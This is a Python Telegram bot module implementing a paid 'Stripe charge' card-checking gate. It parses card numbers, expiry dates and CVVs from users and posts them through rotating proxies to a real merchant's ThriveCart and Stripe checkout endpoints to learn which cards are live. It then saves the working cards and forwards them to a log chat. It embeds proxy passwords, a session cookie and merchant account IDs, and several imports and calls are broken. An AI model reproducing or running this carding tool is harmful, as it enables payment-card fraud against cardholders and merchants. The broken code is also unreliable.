import time
from pyrogram import Client
from pyrogram.methods import auth
import requests
from requests.exceptions import ProxyError
import re
import bs4
from values import *
from pyrogram import Client, filters
import json


arr = ['http://copunwcs-rotate:zpxyewfj84cp@p.webshare.io:80/',
    'http://juigtril-rotate:7iwuusjuufgp@p.webshare.io:80/',
    'http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/',
    'http://vctalybl-rotate:9bs22acxfssz@p.webshare.io:80/',
    'http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/',
    'http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/']

@Client.on_message(filters.command(["aa"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def aa(Client, message):
    try:
        started_time = time.time()
        banned_bins = open('files/bannedbin.txt', 'r').readlines()
        verified_gps = open('files/groups.txt', 'r').readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            find = maindb.find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(use_not_registered)
            elif find['status'] == "F":
                await msg.edit_text(free_user)
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "FREE PLAN",
                        "role": "FREE USER",
                        "status": "F",
                        "credits": 0}}, upsert=False)
            else:
                antispam_time = int(antidb.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect.")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty.")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if int(cc[0]) in waste_cards:
                            await msg.edit_text("Your Card Is Invalid.")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short.")
                        elif int(len(mes)) not in [2,4] or len(mes) == 2 and mes > '12' or len(mes) == 2 and mes < '01' or len(mes) != 2:
                            await msg.edit_text("Your Card Month Is Incorrect.")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2  or len(ano) == 2 and ano < '21' or len(ano)  == 4 and ano < '2021' or len(ano) == 2 and ano > '29' or len(ano)  == 4 and ano > '2029' or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect.")
                        elif int(cc[0]) == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect.")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card Is Invalid.")
                            elif str(bin) + "\n"in banned_bins or "PREPAID" in res.text:
                                await msg.edit_text("Your Card Is Banned.")
                            else:
                                bin_data = json.loads(res.text)
                                # vendor = bin_data["data"]["vendor"].lower()
                                proxy = random.choice(arr)
                                proxies = { 'http' : proxy, 'https' : proxy}
                                curl =  requests.Session()
                                curl.proxies = proxies
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
                                # first_name = random_data['results'][0]['name']['first']
                                # last_name = random_data['results'][0]['name']['last']
                                # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
                                # city = random_data['results'][0]['location']['city']
                                # state = random_data['results'][0]['location']['state']
                                # zip = random_data['results'][0]['location']['postcode']
                                email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                # password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url= 'https://weldpro.thrivecart.com/api/v1/stripepay/intent'
                                headers = {
                                'authority':'weldpro.thrivecart.com',
                                'accept':'application/json, text/javascript',
                                'content-type':'application/x-www-form-urlencoded',
                                'cookie':'thrivecart_v2=i1b4ounn1097r8hbk7550o0pu3',
                                'origin':'https://weldpro.thrivecart.com',
                                'referer':'https://weldpro.thrivecart.com/desert-eagle-design/',
                                'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
                                'x-requested-with':'XMLHttpRequest'}
                                data = {
                                'opts[account_id]':'10037',
                                'opts[product_id]':'37',
                                'opts[amount]':'700',
                                'opts[purchase_type]':'product',
                                'opts[purchase_ref]':'product-37',
                                'opts[product_payment_plan]':'71895',
                                'opts[customer_email]': email,
                                }
                                req = requests.post(url, data=data , headers=headers)
                                json_first = json.loads(req.text)
                                if 'error' in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                elif 'intent' not in json_first:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    antidb.set(message.from_user.id, int(time.time()))
                                else:
                                    intent = json_first["intent"]
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    data = {
                                    'type':'card',
                                    'card[number]': cc,
                                    'card[cvc]': cvv,
                                    'card[exp_month]': mes,
                                    'card[exp_year]': ano,
                                    'guid':'NA',
                                    'muid':'NA',
                                    'sid':'NA',
                                    'pasted_fields':'number',
                                    'payment_user_agent':'stripe.js/7338eae82; stripe-js-v3/7338eae82',
                                    'time_on_page':'99628',
                                    'key':'pk_test_nudcIp2P2QXWrnOwIP0Txt5O',
                                    '_stripe_account':'acct_1FkuZdASKQmu5CY1'}
                                    res = auth.post("https://api.stripe.com/v1/payment_methods",headers=headers,data=data)
                                    json_first = json.loads(res.text)
                                    if 'error' in json_first:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        antidb.set(message.from_user.id, int(time.time()))
                                    elif 'id' not in json_first:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        antidb.set(message.from_user.id, int(time.time()))
                                    else:
                                        id = json_first["id"]
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""

                                        await msg.edit_text(text)
                                        headers = {
    'authority':'weldpro.thrivecart.com',
    'method':'POST',
    'scheme':'https',
    'accept':'application/json, text/javascript',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'thrivecart_v2=i1b4ounn1097r8hbk7550o0pu3',
    'origin':'https://weldpro.thrivecart.com',
    'referer':'https://weldpro.thrivecart.com/desert-eagle-design/',
    'sec-ch-ua-platform':'"Linux"',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'x-requested-with':'XMLHttpRequest',
    }
                                        data = {
                                        'opts[account_id]':'10037',
                                        'opts[product_id]':'37',
                                        'opts[payment_method_id]': id,
                                        'opts[intent_id]':intent,
                                        'opts[customer_email]': email,
                                        'opts[customer_id]':'',
                                        }
                                        res = requests.post("https://weldpro.thrivecart.com/api/v1/stripepay/confirm",headers=headers,data=data)
                                        json_first = json.loads(res.text)
                                        success = json_first['success']
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [1]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        try:
                                            if res.status_code != requests.codes.ok:
                                                response = 'ERROR'
                                                r_logo = '❌'
                                                r_text = 'TOKEN MISSING'  
                                            elif success == True:
                                                save_live(lista)
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED"
                                            elif "Thank" in res.text or "Thank" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or 'Success' in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text:
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED"
                                            elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "LOW FUNDS"
                                            elif "card zip code is incorrect" in res.text or "The zip code you supplied failed validation" in res.text or 'incorrect_zip' in res.text or 'The zip code you supplied failed validation' in res.text:
                                                save_live(lista)
                                                Client.send_message(chat_id=loggp,text=str(lista) + " #zip")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "ZIP INCORRECT"
                                            elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                                save_ccn(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CVV MISMATCH"
                                            elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "PURCHASE NOT ALLOWED"
                                            elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD INCORRECT"
                                            elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "3D SECURITY"
                                            elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text or 'Your card has been declined by your bank' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD DECLINED"
                                            elif 'Do Not Honor' in res.text :
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "NO NOT HONOR"
                                            elif "card has expired" in res.text or 'Expired Card' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD EXPIRED"
                                            else:
                                                response = "NOT SURE"
                                                r_logo = "❗"
                                                r_text = json_first['error']
                                        except Exception as e:
                                            await Client.send_message(chat_id=loggp, text=e)
                                        else:
                                            if response is None:
                                                await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                            else:
                                                credits = find['credits']
                                                credits_left = credits - 2
                                                maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
                                                text = f"""
    <b>〄</b> GATE: <b>STRIPE CHARGE [1]</b>
    <b>○</b> INPUT: <code>{lista}</code>
    <b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
    <b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
    <b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
    <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
    <b>○</b> CREDITS LEFT: {credits_left}credits
    <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
    <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                                await msg.edit_text(text)
                                                r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In za Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
